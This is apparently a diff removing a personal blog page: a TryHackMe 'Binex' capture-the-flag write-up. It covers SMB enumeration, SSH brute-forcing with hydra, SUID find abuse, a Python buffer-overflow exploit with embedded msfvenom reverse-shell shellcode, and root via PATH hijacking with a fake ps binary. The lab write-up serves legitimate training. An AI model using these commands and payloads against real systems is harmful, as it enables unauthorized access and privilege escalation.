@@ -1,57 +1,950 @@
-<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><title>Binex-Tryhackme &#183; Trevor Saudi</title><meta name=title content="Binex-Tryhackme &#183; Trevor Saudi"><meta name=description content="Portfolio/blog"><link rel=canonical href=https://trevorsaudi.com/posts/2021-04-01_binextryhackme/><link type=text/css rel=stylesheet href=/css/main.bundle.min.71883ab0661482cf6c7d29b8bdd1af3be3d2f1ea750e56a67846b7f64f41d19b8dc6d7047f48422ec8cbe4a0a412d551c8210307e2b93b1254cdbf7d8af216e0.css integrity="sha512-cYg6sGYUgs9sfSm4vdGvO+PS8ep1DlameEa39k9B0ZuNxtcEf0hCLsjL5KCkEtVRyCEDB+K5OxJUzb99ivIW4A=="><script type=text/javascript src=/js/appearance.min.badab316c9287a5a42a843e4eb45da65bb3d194a5a0f5fa4a3e516160e67df0b8c65f4f19a8e146436e29d583699e6cb41d6bbe99e05e1dbaa877763bad9f8e2.js integrity="sha512-utqzFskoelpCqEPk60XaZbs9GUpaD1+ko+UWFg5n3wuMZfTxmo4UZDbinVg2mebLQda76Z4F4duqh3djutn44g=="></script>
-<script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.5ffdd39e73bd1438c0f4ff42f13915f067c633da22f60efa62139a4c51b972622badb1157d4aa4322634b55c8a2dc5ddfbd3917426df1c02d7b69362030197da.js integrity="sha512-X/3TnnO9FDjA9P9C8TkV8GfGM9oi9g76YhOaTFG5cmIrrbEVfUqkMiY0tVyKLcXd+9ORdCbfHALXtpNiAwGX2g==" data-copy=Copy data-copied=Copied></script>
-<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:title" content="Binex-Tryhackme"><meta property="og:description" content="Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation."><meta property="og:type" content="article"><meta property="og:url" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/"><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/1.png"><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/2.png"><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/3.png"><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/4.png"><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/5.png"><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/6.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-04-01T18:50:44+00:00"><meta property="article:modified_time" content="2022-05-24T14:31:39+03:00"><meta property="og:site_name" content="Trevor Saudi"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/1.png"><meta name=twitter:title content="Binex-Tryhackme"><meta name=twitter:description content="Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation."><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"Binex-Tryhackme","headline":"Binex-Tryhackme","abstract":"Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.","inLanguage":"en","url":"https:\/\/trevorsaudi.com\/posts\/2021-04-01_binextryhackme\/","author":{"@type":"Person","name":"Trevor Saudi"},"copyrightYear":"2021","dateCreated":"2021-04-01T18:50:44\u002b00:00","datePublished":"2021-04-01T18:50:44\u002b00:00","dateModified":"2022-05-24T14:31:39\u002b03:00","keywords":["Machine","BOF","CTF"],"mainEntityOfPage":"true","wordCount":"820"}]</script><meta name=author content="Trevor Saudi"><link href=https://github.com/trevorsaudi rel=me><link href=https://www.linkedin.com/in/trevor-saudi-9275b8186 rel=me></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 bg-neutral text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral max-w-7xl"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 dark:bg-neutral-600 focus:translate-y-0" href=#main-content><span class="font-bold ltr:pr-2 rtl:pl-2 text-primary-600 dark:text-primary-400">&darr;</span>Skip to main content</a></div><header class="flex justify-between py-6 font-semibold sm:items-center sm:py-10 text-neutral-900 dark:text-neutral print:hidden"><div></div><nav><ul class="flex flex-col list-none sm:flex-row"><li class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/ title>Home</a></li><li class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/posts/ title=Posts>Posts</a></li><li class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/about/ title>About</a></li><li class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/tags/ title=Tags>Tags</a></li><li class="ltr:text-right rtl:text-left ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><button id=search-button class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
-<span class="relative inline-block align-text-bottom icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></li></ul></nav></header><div class=relative><main id=main-content class=grow><article><header class=max-w-prose><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class="inline hidden"><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/></a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/>Posts</a><span class="px-1 text-primary-500">/</span></li><li class="inline hidden"><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/2021-04-01_binextryhackme/>Binex-Tryhackme</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Binex-Tryhackme</h1><div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime="2021-04-01 18:50:44.566 +0000 UTC">1 April 2021</time><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">4 mins</span></div></div></header><section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert"><div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last"><div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden"><details open class="mt-0 overflow-hidden rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 lg:mt-3"><summary class="block py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700">Table of Contents</summary><div class="py-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a><ul><li><a href=#initial-foothold>Initial Foothold</a></li></ul></li><li><a href=#privilege-escalation-1-suid-binary>Privilege escalation #1: SUID binary</a></li><li><a href=#privilege-escalation-2-buffer-overflow>Privilege escalation #2: Buffer Overflow</a><ul><li><a href=#fuzzing-the-binary-file-and-finding-the-offset>Fuzzing the binary file and finding the offset</a></li><li><a href=#overwriting-the-rbp>Overwriting the RBP</a></li><li><a href=#examining-the-stack>Examining the stack</a></li></ul></li><li><a href=#creating-the-final-exploit>Creating the final exploit</a><ul><li><a href=#privilege-escalation-3-path-variable-manipulation>Privilege escalation #3: Path Variable Manipulation</a></li></ul></li></ul></nav></div></details></div></div><div class="min-w-0 min-h-0 max-w-prose"><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/1.png#layoutTextWidth alt=image></figure></p><blockquote><p>Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.</p></blockquote><h2 id=enumeration class="relative group">Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#enumeration aria-label=Anchor>#</a></span></h2><p>Started off by running rustscan to discover open ports. We end up with port 22,139,445</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/2.png#layoutTextWidth alt=image></figure></p><p>Port 139 and 445 are NBT and SMB services which we can enumerate with enum4linux</p><p><a href=https://book.hacktricks.xyz/pentesting/pentesting-smb>139,445 - Pentesting SMB</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>enum4linux -A &lt;IP&gt;
-</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/3.png#layoutTextWidth alt=image></figure></p><p>The shares weren’t particularly worth looking into. So I let the enumeration finish and we discover some users. <code>tryhackme</code> sticks out so let’s try bruteforcing ssh with this user</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/4.png#layoutTextWidth alt=image></figure></p><h3 id=initial-foothold class="relative group">Initial Foothold <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#initial-foothold aria-label=Anchor>#</a></span></h3><p>Running hydra against the username tryhackme and the rockyout.txt password list gives us the password to the ssh login</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/5.png#layoutTextWidth alt=image></figure></p><p>We can now login and exploit the binaries</p><h2 id=privilege-escalation-1-suid-binary class="relative group">Privilege escalation #1: SUID binary <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#privilege-escalation-1-suid-binary aria-label=Anchor>#</a></span></h2><p>We can begin by locating a binary with SUID bit set.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
-</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/6.png#layoutTextWidth alt=image></figure></p><p>The /usr/bin/find can be exploited to execute commands as the des user</p><p><a href=https://gtfobins.github.io/gtfobins/find/#suid>find | GTFOBins</a></p><p>Using the GTFOBins we obtain the command</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/usr/bin/find . -exec /bin/sh -p <span class=se>\;</span> -quit
-</span></span></code></pre></div><p>Execute it to obtain a shell with an effective user id of that of des. Navigate to /home/des to obtain his flag</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/7.png#layoutTextWidth alt=image></figure></p><h2 id=privilege-escalation-2-buffer-overflow class="relative group">Privilege escalation #2: Buffer Overflow <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#privilege-escalation-2-buffer-overflow aria-label=Anchor>#</a></span></h2><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/8.jpeg#layoutTextWidth alt=image></figure></p><p>I am still new to 64-bit BOFs but I was able to navigate my way through this one with a bit of some tutorials.</p><p>Let’s change user and work with des. Here we are given a binary file that accepts a string as input. Supplying a given length crashes it.</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/9.png#layoutTextWidth alt=image></figure></p><p>I checked the file information and it’s a 64-bit ELF file</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/10.png#layoutTextWidth alt=image></figure></p><h3 id=fuzzing-the-binary-file-and-finding-the-offset class="relative group">Fuzzing the binary file and finding the offset <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#fuzzing-the-binary-file-and-finding-the-offset aria-label=Anchor>#</a></span></h3><p>We can generate a bunch of As and try figure out what length of As crash the binary</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/11.png#layoutTextWidth alt=image></figure></p><p>Let’s do this inside gdb and observer how our registers behave</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/12.png#layoutTextWidth alt=image></figure></p><p>The rbp is overwritten with the As. Let us send a cyclic pattern and see if we can calculate the offset.</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/13.png#layoutTextWidth alt=image></figure></p><p>Send that to our program , inspect the registers and copy the value of the rbp</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/14.png#layoutTextWidth alt=image></figure></p><p>Use pattern_offset to find the pattern. We get it at 608</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/15.png#layoutTextWidth alt=image></figure></p><h3 id=overwriting-the-rbp class="relative group">Overwriting the RBP <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#overwriting-the-rbp aria-label=Anchor>#</a></span></h3><p>We can confirm we have control over the RBP by trying to overwrite it. Generate a payload of 608 As + 8Bs</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/16.png#layoutTextWidth alt=image></figure></p><p>The rbp is overwritten with the 8Bs.</p><h3 id=examining-the-stack class="relative group">Examining the stack <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#examining-the-stack aria-label=Anchor>#</a></span></h3><p>We now need to examine the stack further so we can find the starting address of the buffer. The command below prints 100 bytes from the top of the stack
-<code>x/100x $rsp</code><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/17.png#layoutTextWidth alt=image></figure></p><p>The command below gets us the start of the buffer</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>x/100x <span class=nv>$rsp</span>-700
-</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/18.png#layoutTextWidth alt=image></figure></p><p>We can note down an address close to the start of the buffer, we will use this as the value of the rip while creating our final exploit</p><h2 id=creating-the-final-exploit class="relative group">Creating the final exploit <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#creating-the-final-exploit aria-label=Anchor>#</a></span></h2><p>We intially found our offset to be <strong>608 bytes</strong>, which means that if we write past <strong>608 bytes</strong> eg <strong>608 +8 = 616 bytes</strong> , we will overwrite the base pointer in the stack. Note that the return address lies just above it, hence <strong>616+8 bytes</strong> are required to overwrite the saved return address.</p><p>Let us create a shellcode which we use to spawn a shell using <strong>msfvenom</strong></p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/19.png#layoutTextWidth alt=image></figure></p><p>Putting all these into a python script</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python3 data-lang=python3><span class=line><span class=cl><span class=kn>from</span> <span class=nn>struct</span> <span class=kn>import</span> <span class=n>pack</span>
-</span></span><span class=line><span class=cl><span class=n>payload_len</span> <span class=o>=</span> <span class=mi>616</span>
-</span></span><span class=line><span class=cl><span class=n>nop</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x90</span><span class=s2>&#34;</span><span class=o>*</span><span class=mi>200</span>
-</span></span><span class=line><span class=cl><span class=n>new_rip</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span><span class=mh>0x7fffffffe2d4</span><span class=p>)</span> <span class=c1>#selected randomly near the start of the stack</span>
-</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span>  <span class=sa>b</span><span class=s2>&#34;&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xef\xff\xff\xff\x48\xbb\x32\xa3\x67\xe0\x79\x51\x8b</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x33\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x58\x8a\x3f\x79\x13\x53\xd4\x59\x33\xfd\x68\xe5\x31</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xc6\xc3\x8a\x30\xa3\x76\xbc\x73\x53\xa2\x92\x63\xeb</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xee\x06\x13\x41\xd1\x59\x18\xfb\x68\xe5\x13\x52\xd5</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x7b\xcd\x6d\x0d\xc1\x21\x5e\x8e\x46\xc4\xc9\x5c\xb8</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xe0\x19\x30\x1c\x50\xca\x09\xcf\x0a\x39\x8b\x60\x7a</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x2a\x80\xb2\x2e\x19\x02\xd5\x3d\xa6\x67\xe0\x79\x51</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x8b\x33</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>buf</span>
-</span></span><span class=line><span class=cl><span class=n>shellcode_len</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>nop_len</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>nop</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>padding</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=p>(</span><span class=n>payload_len</span><span class=o>-</span><span class=n>shellcode_len</span><span class=o>-</span><span class=n>nop_len</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>[</span>
-</span></span><span class=line><span class=cl> <span class=n>nop</span><span class=p>,</span>
-</span></span><span class=line><span class=cl> <span class=n>shellcode</span><span class=p>,</span>
-</span></span><span class=line><span class=cl> <span class=n>padding</span><span class=p>,</span>
-</span></span><span class=line><span class=cl> <span class=n>new_rip</span>
-</span></span><span class=line><span class=cl><span class=p>]</span>
-</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span> 
-</span></span></code></pre></div><p><em>The nop_sled is used to increase our chances of hitting the shellcode hence providing some stability to the exploit. The struct module ensures we obey little endian format</em></p><p>Start a meterpreter shell or a nc one listening on port 4444</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/20.png#layoutTextWidth alt=image></figure></p><p>We get a reverse shell as kel user :) Get the flag and credentials to ssh as kel</p><h3 id=privilege-escalation-3-path-variable-manipulation class="relative group">Privilege escalation #3: Path Variable Manipulation <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#privilege-escalation-3-path-variable-manipulation aria-label=Anchor>#</a></span></h3><p>PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored</p><p><figure><img class="my-0 rounded-md" src=/posts/2021-04-01_binextryhackme/images/21.png#layoutTextWidth alt=image></figure></p><p>the exe.c file on user kel’s home directory shows that we are calling the ps system command. The program will search the ps command in the directories of the PATH variable. We can print out the PATH variables for the kel user as follows</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kel@THM_exploit:~$ <span class=nb>echo</span> <span class=nv>$PATH</span>  
-</span></span><span class=line><span class=cl>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
-</span></span><span class=line><span class=cl>kel@THM_exploit:~$
-</span></span></code></pre></div><p>We can stage our attack as follows - Create our own ps file that spawns a shell and add it to the beginning of $PATH. So when we run the exec binary, we get a shell as root</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kel@THM_exploit:~$ <span class=nb>cd</span> /tmp  
-</span></span><span class=line><span class=cl>kel@THM_exploit:/tmp$ <span class=nb>echo</span> “/bin/bash” &gt; ps  
-</span></span><span class=line><span class=cl>kel@THM_exploit:/tmp$ chmod <span class=m>777</span> ps  
-</span></span><span class=line><span class=cl>kel@THM_exploit:/tmp$ <span class=nb>echo</span> <span class=nv>$PATH</span>  
-</span></span><span class=line><span class=cl>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
-</span></span><span class=line><span class=cl>kel@THM_exploit:/tmp$ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span>/tmp:<span class=nv>$PATH</span>  
-</span></span><span class=line><span class=cl>kel@THM_exploit:/tmp$ <span class=nb>cd</span>  
-</span></span><span class=line><span class=cl>kel@THM_exploit:~$ ./exe   
-</span></span><span class=line><span class=cl>root@THM_exploit:~#<span class=sb>`</span>
-</span></span></code></pre></div><p>We get root !</p></div></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group" href=/posts/2021-03-28_tryhackme-brainstorm/><span class="mr-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&larr;</span>
-<span class="ml-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&rarr;</span>
-<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">TryhackMe -BrainStorm</span>
-<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2021-03-28 15:51:16.293 +0000 UTC">28 March 2021</time></span></span></a></span>
-<span><a class="flex text-right group" href=/posts/2021-04-05_brainpantryhackme/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">BrainPan-Tryhackme</span>
-<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2021-04-05 18:46:03.757 +0000 UTC">5 April 2021</time></span></span>
-<span class="ml-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&rarr;</span>
-<span class="mr-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer></article><div class="absolute top-[110vh] ltr:right-0 rtl:left-0 w-12 pointer-events-none bottom-0"><a href=#the-top class="w-12 h-12 sticky pointer-events-auto top-[calc(100vh-5.5rem)] bg-neutral/50 dark:bg-neutral-800/50 backdrop-blur rounded-full text-xl flex items-center justify-center text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><div id=search-wrapper class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible" data-url=https://trevorsaudi.com/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg border-neutral-200 top-20 bg-neutral dark:bg-neutral-800 dark:border-neutral-700"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative inline-block align-text-bottom icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-transparent focus:outline-2" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400" title="Close (Esc)">
-<span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div><footer class="py-10 print:hidden"><div class="flex justify-between"><div><p class="text-sm text-neutral-500 dark:text-neutral-400">😄</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" 